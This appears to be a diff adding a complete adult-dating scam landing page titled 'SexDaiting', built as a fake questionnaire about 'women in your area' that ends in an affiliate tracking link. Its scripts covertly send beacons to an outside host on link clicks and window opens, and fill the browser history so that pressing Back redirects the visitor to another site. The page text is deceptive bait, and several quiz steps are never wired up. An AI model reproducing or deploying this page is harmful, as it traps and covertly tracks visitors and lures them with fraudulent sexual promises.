@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script type="text/javascript">(function (apiUrl, apiData, lpUrl) {
+    var apiFormData = new FormData();
+    for (var i in apiData) {
+        apiFormData.append(i, apiData[i]);
+    }
+
+    function sendBeacon() {
+        navigator.sendBeacon(apiUrl, apiFormData);
+    }
+
+    function ajaxBeacon() {
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', apiUrl);
+        xhr.send(apiFormData);
+    }
+
+    function onWindowOpen() {
+        window.open = (function (fnOpen) {
+            return function () {
+                ajaxBeacon();
+                return fnOpen.apply(window, arguments);
+            }
+        })(window.open);
+    }
+
+    function onAnchorClick() {
+        var tags = {a: "href", form: "action"}, tag, action;
+        for (tag in tags) {
+            action = tags[tag];
+            document.querySelectorAll(`${tag}[${action}^="${lpUrl}"],${tag}[${action}^='${lpUrl}']`)
+                .forEach(function (a) {
+                    // на любой клик пытаемся послать ajax
+                    a.addEventListener("click", ajaxBeacon, false);
+                    if ("_blank" !== a.getAttribute('target')) {
+                        // если страница открывается в том же окне, то ajax может не успеть дойти,
+                        // делаем sendBeacon для надёжности
+                        a.addEventListener("click", sendBeacon, false);
+                    }
+                });
+        }
+    }
+
+    function onMetaRefresh() {
+        document.querySelectorAll(`meta[http-equiv="refresh"],meta[http-equiv='refresh']`)
+            .forEach(function ( meta ) {
+                var content = meta.getAttribute('content').split(/;url=/i, 2);
+                var url = content[1];
+                if (0 === url.indexOf(lpUrl)) {
+                    var timeout = parseInt(content[0]) || 0;
+                    if (timeout <= 1) {
+                        sendBeacon();
+                    } else {
+                        setTimeout(function () {
+                            sendBeacon();
+                        }, timeout * 1000 - 1000);
+                    }
+                }
+            });
+    }
+
+    window.addEventListener("DOMContentLoaded", function () {
+        onWindowOpen();
+        onMetaRefresh();
+        onAnchorClick();
+    }, false);
+
+})('https:\/\/cujvik.com\/prelp\/beacon', JSON.parse('{"h":"35f2e3b00302c14a332caded9a648b5a","t":1655975683}'), 'https:\/\/xkt.bizzliving.com\/6rtv3?click_id=3860161355&_sub_aff_id=27765_');
+</script>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="">
+  <title>SexDaiting</title>
+  <link href="files/bootstrap.css" rel="stylesheet">
+</head>
+
+<body
+  style="display: block;  background: url(&#39;files/background.jpg&#39;); background-repeat: no-repeat; background-size: cover"
+  data-gr-c-s-loaded="true" class="vsc-initialized">
+
+  <script>
+    !function () {
+      var t;
+      try {
+        for (t = 0; 10 > t; ++t)history.pushState({}, "", "");
+        onpopstate = function (t) {
+          t.state && location.replace("\/\/vidfun.net\/e54afcd2966a6a07f168d60e45003069bc43ee25\/?c=1c515d3441d0df80-9a&h=35f2e3b00302c14a332caded9a648b5a&s=1&lph=1")
+        }
+      }
+      catch (o) { }
+    }();
+  </script>
+
+  <section id="step1">
+    <div class="container-fluid">
+      <div class="col-md-12">
+        <div class="row">
+          <div class="col-md-6 col-12 ">
+            <img class="image img-fluid" src="files/1.png">
+
+          </div>
+          <div class="col-md-5 col-12  block">
+            <h2>WARNING! <br> HERE YOU WILL SEE NUDE PHOTOS.</h2>
+            <div id="press1" class="btnnext button13">
+              Ok
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="step2" style="display: none;">
+    <div class="container-fluid">
+      <div class="col-md-12">
+        <div class="row">
+          <div class="col-md-6 ">
+            <img class="image img-fluid" src="files/2.png">
+
+          </div>
+          <div class="col-md-5 block">
+            <h3>BE DISCREET!</h3>
+            <p class="text-center"> Before showing you a list and photos of women who live in your area and who are
+              ready to <b><u> have sex right now </u></b>, we need to ask you four questions.</p>
+            <p>
+            </p>
+            <div id="press2" class="btnnext button13">
+              Continue
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="step3" style="display: none;">
+    <div class="container-fluid">
+      <div class="col-md-12">
+        <div class="row">
+          <div class="col-md-6 ">
+            <img class="image img-fluid" src="files/3.png">
+          </div>
+
+          <div class="col-md-5 block">
+            <div class="top">
+              Question
+              <span class="circle1">1</span>
+              <span class="circle2">2</span>
+              <span class="circle2">3</span>
+              <span class="circle2">4</span>
+            </div>
+            <p class="mt-5"> Many of these women are young mothers who are single or married and interested in jumping
+              the fence. They can be a neighbor of yours or someone you already know. Do you agree to maintain secrecy
+              about the identity of these women?</p>
+            <p>
+            </p>
+            <div id="press3">
+              <div class="btnyes button13">Yes</div>
+              <div class="btnno button13"> No</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="step4" style="display: none;">
+    <div class="container-fluid">
+      <div class="col-md-12">
+        <div class="row">
+          <div class="col-md-6 ">
+            <img class="image img-fluid" src="files/4.png">
+          </div>
+
+          <div class="col-md-5 block">
+            <div class="top">
+              Question
+              <span class="circle2">1</span>
+              <span class="circle1">2</span>
+              <span class="circle2">3</span>
+              <span class="circle2">4</span>
+            </div>
+            <p class="mt-5">These women asked that we not allow men who are interested in "relationships" to
+              participate. They make it clear that they just want fast, uncomplicated sex. They are not interested in
+              anything serious. Do you agree with their request?</p>
+            <p>
+            </p>
+            <div id="press4">
+              <div class="btnyes button13">Yes</div>
+              <div class="btnno button13"> No</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="step5" style="display: none;">
+    <div class="container-fluid">
+      <div class="col-md-12">
+        <div class="row">
+          <div class="col-md-6 ">
+            <img class="image img-fluid" src="files/5.png">
+          </div>
+          <div class="col-md-5 block">
+            <div class="top">
+              Question
+              <span class="circle2">1</span>
+              <span class="circle2">2</span>
+              <span class="circle1">3</span>
+              <span class="circle2">4</span>
+            </div>
+            <p class="mt-5">Do you agree to use a condom when having sex with someone you know through our site? </p>
+            <p>
+            </p>
+            <div id="press5">
+              <div class="btnyes button13">Yes</div>
+              <div class="btnno button13"> No</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="step6" style="display: none;">
+    <div class="container-fluid">
+      <div class="col-md-12">
+        <div class="row">
+          <div class="col-md-6 ">
+            <img class="image img-fluid" src="files/6.png">
+          </div>
+          <div class="col-md-5 block">
+            <div class="top">
+              Question
+              <span class="circle2">1</span>
+              <span class="circle2">2</span>
+              <span class="circle2">3</span>
+              <span class="circle1">4</span>
+            </div>
+            <p class="mt-5"> Are you at least 18 years old? The women who come to our site asked us not to let people in
+              here who are under 18 years to avoid situations that have already occurred of inelegant behavior by the
+              younger guys. </p>
+            <p>
+            </p>
+            <div id="press6">
+              <div class="btnyes button13">Yes</div>
+              <div class="btnno button13"> No</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="step7" style="display: none;">
+    <div class="container-fluid">
+      <div class="col-md-12">
+        <div class="row">
+          <div class="col-md-6 ">
+            <img class="image img-fluid" src="files/7.png">
+          </div>
+          <div class="col-md-5 block">
+            <h4>What kind of physical moves make you hard?</h4>
+            <div class="ml-5 mb-4">
+              <div class="form-check">
+                <input class="form-check-input" type="radio" name="exampleRadios" id="exampleRadios1" value="option1"
+                  checked="">
+                <label class="form-check-label" for="exampleRadios1">
+                  Slim
+                </label>
+              </div>
+
+              <div class="form-check">
+                <input class="form-check-input" type="radio" name="exampleRadios" id="exampleRadios1" value="option1"
+                  checked="">
+                <label class="form-check-label" for="exampleRadios1">
+                  Neither fat nor thin
+                </label>
+              </div>
+
+              <div class="form-check">
+                <input class="form-check-input" type="radio" name="exampleRadios" id="exampleRadios1" value="option1"
+                  checked="">
+                <label class="form-check-label" for="exampleRadios1">
+                  Fat &amp; pretty
+                </label>
+              </div>
+
+              <div class="form-check">
+                <input class="form-check-input" type="radio" name="exampleRadios" id="exampleRadios1" value="option1"
+                  checked="">
+                <label class="form-check-label" for="exampleRadios1">
+                  Big chest is essential
+                </label>
+              </div>
+
+              <div class="form-check">
+                <input class="form-check-input" type="radio" name="exampleRadios" id="exampleRadios1" value="option1"
+                  checked="">
+                <label class="form-check-label" for="exampleRadios1">
+                  Sexy butt is essential
+                </label>
+              </div>
+            </div>
+            <div id="press7">
+              <div class="btnyes button13">Next »</div>
+              <div class="btnno button13">Ignore »</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="step8" style="display: none;">
+    <div class="container-fluid">
+      <div class="col-md-12">
+        <div class="row">
+          <div class="col-md-6 ">
+            <img class="image img-fluid" src="files/8.png">
+          </div>
+          <div class="col-md-5 block">
+            <h4>Which age group makes up your head?</h4>
+            <div class="ml-5 mb-4">
+              <div class="form-check">
+                <input class="form-check-input" type="radio" name="exampleRadios" id="exampleRadios1" value="option1"
+                  checked="">
+                <label class="form-check-label" for="exampleRadios1">
+                  21 - 25
+                </label>
+              </div>
+              <div class="form-check">
+                <input class="form-check-input" type="radio" name="exampleRadios" id="exampleRadios1" value="option1"
+                  checked="">
+                <label class="form-check-label" for="exampleRadios1">
+                  25 - 32
+                </label>
+              </div>
+
+              <div class="form-check">
+                <input class="form-check-input" type="radio" name="exampleRadios" id="exampleRadios1" value="option1"
+                  checked="">
+                <label class="form-check-label" for="exampleRadios1">
+                  32 - 37
+                </label>
+              </div>
+              <div class="form-check">
+                <input class="form-check-input" type="radio" name="exampleRadios" id="exampleRadios1" value="option1"
+                  checked="">
+                <label class="form-check-label" for="exampleRadios1">
+                  37 - 45
+                </label>
+              </div>
+              <div class="form-check">
+                <input class="form-check-input" type="radio" name="exampleRadios" id="exampleRadios1" value="option1"
+                  checked="">
+                <label class="form-check-label" for="exampleRadios1">
+                  45 years up
+                </label>
+              </div>
+            </div>
+            <div id="press8">
+              <div class="btnyes button13">Next »</div>
+              <div class="btnno button13"> Ignore »</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="step9" style="display: none;">
+    <div class="container-fluid">
+      <div class="col-md-12">
+        <div class="row">
+          <div class="col-md-6 ">
+            <img class="image img-fluid" src="files/9.png">
+          </div>
+          <div class="col-md-5 block">
+            <h4>What kind of relationship are you looking for?</h4>
+            <div class="ml-5 mb-4">
+              <div class="form-check">
+                <input class="form-check-input" type="radio" name="exampleRadios" id="exampleRadios1" value="option1"
+                  checked="">
+                <label class="form-check-label" for="exampleRadios1">
+                  A fuck just and nothing more
+                </label>
+              </div>
+              <div class="form-check">
+                <input class="form-check-input" type="radio" name="exampleRadios" id="exampleRadios1" value="option1"
+                  checked="">
+                <label class="form-check-label" for="exampleRadios1">
+                  Get on several different days
+                </label>
+              </div>
+              <div class="form-check">
+                <input class="form-check-input" type="radio" name="exampleRadios" id="exampleRadios1" value="option1"
+                  checked="">
+                <label class="form-check-label" for="exampleRadios1">
+                  To engage regularly
+                </label>
+              </div>
+              <div class="form-check">
+                <input class="form-check-input" type="radio" name="exampleRadios" id="exampleRadios1" value="option1"
+                  checked="">
+                <label class="form-check-label" for="exampleRadios1">
+                  Dating
+                </label>
+              </div>
+              <div class="form-check">
+                <input class="form-check-input" type="radio" name="exampleRadios" id="exampleRadios1" value="option1"
+                  checked="">
+                <label class="form-check-label" for="exampleRadios1">
+                  Marriage
+                </label>
+              </div>
+            </div>
+            <div id="press9">
+              <div class="btnyes button13">Next »</div>
+              <div class="btnno button13"> Ignore »</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+
+  <section id="step10" style="display: none;">
+    <div class="container-fluid">
+      <div class="col-md-12">
+        <div class="row">
+          <div class="col-md-6 ">
+            <img class="image img-fluid" src="files/10.png">
+          </div>
+          <div class="col-md-5 block">
+            <h4>Distance between her and you?</h4>
+            <div class="ml-5 mb-4">
+              <div class="form-check">
+                <input class="form-check-input" type="radio" name="exampleRadios" id="exampleRadios1" value="option1"
+                  checked="">
+                <label class="form-check-label" for="exampleRadios1">
+                  1 to 5 km away from me
+                </label>
+              </div>
+              <div class="form-check">
+                <input class="form-check-input" type="radio" name="exampleRadios" id="exampleRadios1" value="option1"
+                  checked="">
+                <label class="form-check-label" for="exampleRadios1">
+                  Same town
+                </label>
+              </div>
+              <div class="form-check">
+                <input class="form-check-input" type="radio" name="exampleRadios" id="exampleRadios1" value="option1"
+                  checked="">
+                <label class="form-check-label" for="exampleRadios1">
+                  Also nearby towns
+                </label>
+              </div>
+              <div class="form-check">
+                <input class="form-check-input" type="radio" name="exampleRadios" id="exampleRadios1" value="option1"
+                  checked="">
+                <label class="form-check-label" for="exampleRadios1">
+                  Same country
+                </label>
+              </div>
+              <div class="form-check">
+                <input class="form-check-input" type="radio" name="exampleRadios" id="exampleRadios1" value="option1"
+                  checked="">
+                <label class="form-check-label" for="exampleRadios1">
+                  Does not matter
+                </label>
+              </div>
+            </div>
+            <div id="press10">
+              <div class="btnyes button13">Next »</div>
+              <div class="btnno button13"> Ignore »</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="step11" style="display: none;">
+    <div class="container-fluid">
+      <div class="col-md-12">
+        <div class="row">
+          <div class="col-md-6 ">
+            <img class="image img-fluid" src="files/11.png">
+          </div>
+          <div class="col-md-5 block">
+            <h3>Thanks.</h3>
+            <p class="text-center">Now you can check our list and photos of women from your region. But again, we ask
+              that you never reveal their identity. <br> Click the "Continue" button and search according to your zip
+              code</p>
+            <p>
+              <a href="https://xkt.bizzliving.com/6rtv3?click_id=3860161355&amp;_sub_aff_id=27765_" class="btnnext button16">
+                Continue »
+
+              </a>
+
+            </p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </section>
+
+  <script src="files/jquery.min.js"></script>
+  <script>
+
+    $(document).ready(function () {
+
+
+      $("#press1").click(function (e) {
+        e.preventDefault();
+        $("#step2").fadeIn("slow");
+        $("#step1").hide();
+      });
+
+      $("#press2").click(function (e) {
+        e.preventDefault();
+        $("#step3").fadeIn("slow");
+        $("#step2").hide();
+      });
+
+      $("#press3").click(function (e) {
+        e.preventDefault();
+        $("#step4").fadeIn("slow");
+        $("#step3").hide();
+      });
+
+      $("#press4").click(function (e) {
+        e.preventDefault();
+        $("#step5").fadeIn("slow");
+        $("#step4").hide();
+      });
+
+      $("#press5").click(function (e) {
+        e.preventDefault();
+        $("#step6").fadeIn("slow");
+        $("#step5").hide();
+      });
+
+      $("#press6").click(function (e) {
+        e.preventDefault();
+        $("#step11").fadeIn("slow");
+        $("#step6").hide();
+      });
+
+
+
+
+
+
+
+
+    });
+
+  </script>
+
+</body>
+
+</html>
